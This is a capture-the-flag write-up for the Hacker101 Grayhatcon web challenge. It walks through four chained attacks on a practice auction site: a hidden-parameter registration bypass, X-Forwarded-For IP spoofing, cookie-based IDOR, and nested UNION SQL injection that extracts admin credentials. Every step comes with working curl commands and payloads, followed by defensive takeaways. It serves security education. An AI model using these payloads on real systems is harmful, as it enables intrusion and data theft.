# Hacker101 CTF — Grayhatcon CTF (Moderate)

**Platform:** HackerOne CTF  
**Challenge:** Grayhatcon CTF  
**Difficulty:** Moderate  
**Category:** Web / Input Validation / IP Spoofing / IDOR / SQL Injection  
**Flags:** 4

---

## Overview

Grayhatcon CTF is an auction platform vulnerability chain. HackerOne's username and password database has been leaked and listed for auction by a user named `hunter2`. The objective is to chain four vulnerabilities — input validation bypass, IP spoofing, IDOR, and nested SQL injection — to gain admin access and delete the auction listing before anyone buys it.

The application is a PHP/nginx auction platform called "HackerBay" with user registration, subuser management, auction creation, and an admin panel protected by IP restrictions.

**Server:** nginx/1.15.8 (OpenResty reverse proxy), PHP

---

## Reconnaissance

### Application Flow

The application exposes these endpoints:

| Endpoint | Purpose |
|----------|---------|
| `GET /` | Homepage — auction listings |
| `GET /register`, `POST /register` | User registration |
| `GET /login`, `POST /login` | User login |
| `GET /reset`, `POST /reset` | Password reset |
| `GET /auction/{id}` | View auction details |
| `GET /dashboard` | User dashboard (auth required) |
| `GET /dashboard/subusers` | Subuser management (auth required) |
| `GET /dashboard/auctions` | Auction management (auth required) |
| `GET /s3cr3t-4dm1n/` | Admin panel (IP-restricted) |

### Key Observations

- **`robots.txt`** reveals `/s3cr3t-4dm1n/` — returns 403 Forbidden
- **Auction #8** is the "HackerOne Username/Password List" auctioned by `hunter2`
- **Password reset for `hunter2`** reveals the account hash: `cf505baebbaf25a0a4c63eb93331eb36`
- **Registration form** uses `new_username` + `new_password` as field names
- **Subuser creation form** includes a hidden `owner_hash` field tying the subuser to a parent account
- **Admin panel** has a `.htaccess` restricting access to `8.8.8.8` / `8.8.4.4`

### Technology Stack

- **Web server:** nginx/1.15.8
- **Reverse proxy:** OpenResty
- **Backend:** PHP with MySQL
- **Auth:** Token-based session cookies + userhash cookies

---

## Flag 0 — Input Validation Bypass on Registration

**Method:** Include hidden `owner_hash` field on `/register` to create a subuser under hunter2's account

**Hint:** *"The registration form might have fields you missed!"*

### The Vulnerability

The normal registration form at `/register` accepts `new_username` and `new_password`. The subuser creation form at `/dashboard/subusers` accepts three fields: `owner_hash`, `new_username`, and `new_password`. Both forms use the same backend handler — the registration form silently accepts the undocumented `owner_hash` parameter. By supplying hunter2's hash as `owner_hash`, a subuser is created under hunter2's account.

Hunter2's account hash is obtained via the password reset form:

```
hunter2 hash: cf505baebbaf25a0a4c63eb93331eb36
```

### The Attack

```bash
curl -s -X POST \
  'https://TARGET.ctf.hacker101.com/register' \
  -d 'owner_hash=cf505baebbaf25a0a4c63eb93331eb36&new_username=partypooper&new_password=partypooper'
```

**Response:**

```json
{"username":"partypooper","flag":"^FLAG^<redacted>$FLAG$","message":"User created"}
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Always validate that every parameter submitted to a handler is expected and authorized. The registration endpoint accepted an undocumented `owner_hash` parameter that allowed privilege escalation to any user's parent account. Never assume that undocumented parameters are simply ignored — validate and whitelist expected input fields.

---

## Flag 1 — IP Spoofing on Admin Panel

**Method:** Bypass IP restriction on `/s3cr3t-4dm1n/` using `X-Forwarded-For: 8.8.8.8`

**Hint:** *(none provided)*

### The Vulnerability

The `/s3cr3t-4dm1n/` directory (disclosed by `robots.txt`) returns 403 Forbidden. Fuzzing the directory reveals a `.htaccess` file that restricts access to IP addresses `8.8.8.8` and `8.8.4.4`. The web server trusts the `X-Forwarded-For` header from the client, allowing an attacker to spoof their source IP.

### The Attack

**Step 1 — Discover the IP restriction via fuzzing:**

```bash
ffuf -u https://TARGET.ctf.hacker101.com/s3cr3t-4dm1n/FUZZ \
  -w /path/to/SecLists/Discovery/Web-Content/common.txt
# → .htaccess [Status: 200]
```

The `.htaccess` contents reveal the whitelisted IPs.

**Step 2 — Bypass with spoofed header:**

```bash
curl -s -H 'X-Forwarded-For: 8.8.8.8' \
  'https://TARGET.ctf.hacker101.com/s3cr3t-4dm1n/'
```

**Response:**

```html
<div class="alert alert-info">
  <p>^FLAG^<redacted>$FLAG$</p>
</div>
<form method="post">
  <!-- Admin login form -->
  <input name="username">
  <input type="password" name="password">
</form>
```

> **Flag 1:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** IP-based access controls that trust `X-Forwarded-For` are trivially bypassable. The `X-Forwarded-For` header is client-supplied and can be set to any value. Server-side IP restrictions should use the actual connecting IP address (from the TCP connection), not headers added by proxies or clients. Always validate that the trusted proxy chain is intact before trusting forwarded headers.

---

## Flag 2 — IDOR via Subuser Toggle + userhash Cookie Manipulation

**Method:** Enable hunter2's subuser (partypooper) by toggling with hunter2's `userhash` cookie from a different account

**Hint:** *(none provided)*

### The Vulnerability

The subuser management page has enable/disable toggle functionality. When toggling a subuser, the server checks the `userhash` cookie against the subuser's `owner_hash` for authorization. By setting the `userhash` cookie to hunter2's hash (`cf505baebbaf25a0a4c63eb93331eb36`) while authenticated as a different user, the authorization check passes and hunter2's subuser can be toggled.

Partypooper (created in Flag0) was registered as hunter2's subuser but remained inactive, awaiting activation from the parent account. Using exploit101's (a normal user with subuser functionality enabled) toggle form with hunter2's `userhash` cookie activates partypooper.

### The Attack

**Step 1 — Login as a normal user (exploit101) and enable subusers:**

```bash
curl -s -c cookies.txt -X POST \
  'https://TARGET.ctf.hacker101.com/login' \
  -d 'username=exploit101&password=exploit101'

curl -s -b cookies.txt -X POST \
  'https://TARGET.ctf.hacker101.com/dashboard/subusers' \
  -d 'action=enable_subusers'
```

**Step 2 — Toggle partypooper with hunter2's userhash cookie:**

```bash
TOKEN="<token_from_cookies.txt>"
PARTY_HASH="833365890188fff60a8effbca9717f11"

curl -s -X POST \
  'https://TARGET.ctf.hacker101.com/dashboard/subusers' \
  -H "Cookie: token=${TOKEN}; userhash=cf505baebbaf25a0a4c63eb93331eb36" \
  -d "hash=${PARTY_HASH}&enable_toggle=enable"
```

**Step 3 — Login as partypooper to see the activated dashboard:**

```bash
curl -s -X POST \
  'https://TARGET.ctf.hacker101.com/login' \
  -d 'username=partypooper&password=partypooper'
```

**Response on dashboard:**

```html
<div class="alert alert-info">
  <p>^FLAG^<redacted>$FLAG$</p>
</div>
```

> **Flag 2:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Insecure Direct Object Reference (IDOR) occurs when authorization checks rely on client-controlled values. The `userhash` cookie determined WHOSE subusers were being managed, but the server never verified that the cookie value matched the authenticated session. Always derive authorization context from the server-side session, not from client-supplied cookies or parameters. The `userhash` should have been looked up from the authenticated session, not trusted from the client.

---

## Flag 3 — Nested SQL Injection → Admin Access → Auction Deletion

**Method:** SQL injection on `/dashboard/auctions/questions?id=` to extract admin credentials, then login to admin panel and delete the auction

**Hint:** *(none provided)*

### The Vulnerability

The auction creation page includes JavaScript that loads auction type questions via `GET /dashboard/auctions/questions?id=X`. The `id` parameter is vulnerable to SQL injection. However, the SQLi is "nested" — the application constructs a SQL query whose result is a JSON string, and that JSON string is then used in ANOTHER SQL query. This requires crafting a payload where the inner SQL query returns a valid inner SQL query string.

### The Attack

**Step 1 — Confirm SQLi with boolean test:**

```bash
# FALSE → 404
curl -s -b cookies.txt 'https://TARGET.ctf.hacker101.com/dashboard/auctions/questions?id=5+AND+0--'

# TRUE → 200 with JSON
curl -s -b cookies.txt 'https://TARGET.ctf.hacker101.com/dashboard/auctions/questions?id=5+AND+1--'
```

**Step 2 — Determine inner column count (9 columns):**

```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/dashboard/auctions/questions?id=0%20union%20select%20%270%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%27%2C1%2C%27[]%27--'
```

Positions 1 and 6 map to the `auctions` JSON array (`id` and `title` fields).

**Step 3 — Enumerate tables:**

```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/dashboard/auctions/questions?id=0%20union%20select%20%270%20union%20select%20table_name%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%20from%20information_schema.tables%27%2C1%2C%27[]%27--'
# → Found table: admin
```

**Step 4 — Extract admin credentials:**

```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/dashboard/auctions/questions?id=0%20union%20select%20%270%20union%20select%20username%2C2%2C3%2C4%2C5%2Cpassword%2C7%2C8%2C9%20from%20admin%27%2C2%2C%27[]%27--'
```

**Response:**

```json
{"name":"2","questions":[],"auctions":[{"id":"h4ckerbayadmin","title":"auction$rFun!"}]}
```

Credentials: `h4ckerbayadmin` / `auction$rFun!`

**Step 5 — Login to admin panel with IP spoofing:**

```bash
curl -s -c admin_cookies.txt -X POST \
  'https://TARGET.ctf.hacker101.com/s3cr3t-4dm1n/' \
  -H 'X-Forwarded-For: 8.8.8.8' \
  -d 'username=h4ckerbayadmin&password=auction%24rFun%21'
# → Set-Cookie: admin-token=<token>
```

**Step 6 — Lookup and delete the auction:**

```bash
# Lookup auction
curl -s -b admin_cookies.txt \
  -H 'X-Forwarded-For: 8.8.8.8' \
  -X POST 'https://TARGET.ctf.hacker101.com/s3cr3t-4dm1n/' \
  -d 'auction_hash=8ylbbgs2'

# Delete auction
curl -s -b admin_cookies.txt \
  -H 'X-Forwarded-For: 8.8.8.8' \
  -X POST 'https://TARGET.ctf.hacker101.com/s3cr3t-4dm1n/' \
  -d 'auction_hash=8ylbbgs2&action=delete'
```

**Response:**

```html
<div class="alert alert-success text-center">
  <p>Auction listing has been deleted</p>
  <p>^FLAG^<redacted>$FLAG$</p>
</div>
```

> **Flag 3:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** Nested SQL injection (SQLi within SQLi) is a powerful technique when the application constructs queries from JSON responses. The key insight was that the auction questions endpoint returned JSON strings that were themselves used in SQL queries. By crafting the inner query to return a valid inner SQL injection payload, we achieved full data extraction. Always use parameterized queries — at every level of query construction. Also, `information_schema` access should be restricted in production databases.

---

## Complete Flag List

| Flag | Hash | Vulnerability | Technique |
|:----:|------|:-------------|-----------|
| 0 | `<redacted>` | Input validation bypass | Registered user with hidden `owner_hash=hunter2_hash` → subuser under hunter2 |
| 1 | `<redacted>` | IP spoofing | `X-Forwarded-For: 8.8.8.8` bypassed `.htaccess` IP restriction on `/s3cr3t-4dm1n/` |
| 2 | `<redacted>` | IDOR + cookie manipulation | Toggled partypooper via exploit101's session but hunter2's `userhash` cookie |
| 3 | `<redacted>` | Nested SQL injection | UNION-based double SQLi on `/dashboard/auctions/questions?id=` → admin creds → login → delete auction |

---

## Key Takeaways

1. **Validate all form fields — seen and unseen.** The registration form accepted an undocumented `owner_hash` parameter that silently assigned the new user to any existing account. Always whitelist expected input fields and reject unknown parameters.

2. **IP-based access control is not authentication.** The `X-Forwarded-For` header is client-supplied and trivially spoofable. Never rely on `X-Forwarded-For` for security decisions unless you control and validate the entire proxy chain.

3. **Derive authorization from the session, not client cookies.** The `userhash` cookie controlled authorization for subuser operations, but was never validated against the authenticated session. Any client-supplied value used for authorization decisions is an IDOR waiting to happen.

4. **SQL injection can be nested.** When query results are used to construct other queries, SQL injection becomes an inception problem. The inner query must return a valid inner SQL injection payload. Parameterized queries at every level prevent this entire class of attack.

5. **`robots.txt` is a recon goldmine.** The `/s3cr3t-4dm1n/` path was disclosed in `robots.txt`. Always check common discovery files — they are intentionally public and often reveal high-value targets.

6. **Password reset leaks account identifiers.** The password reset form for `hunter2` returned the `account_hash` in a hidden form field, enabling the entire attack chain. Never expose internal identifiers (hashes, IDs) to unauthenticated users.

7. **Chain vulnerabilities for maximum impact.** Input validation bypass (Flag0) → IP spoofing (Flag1) → IDOR (Flag2) → SQLi (Flag3). Each flag unlocked the next step. Always think about how vulnerabilities can be chained to escalate impact.

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [Hacker101 — SQL Injection (Video)](https://www.hacker101.com/sessions/sqli)
- [Hacker101 — IDOR (Video)](https://www.hacker101.com/sessions/idor)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP — Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [F5 — Security Rule Zero: A Warning About X-Forwarded-For](https://www.f5.com/company/blog/security-rule-zero-a-warning-about-x-forwarded-for)
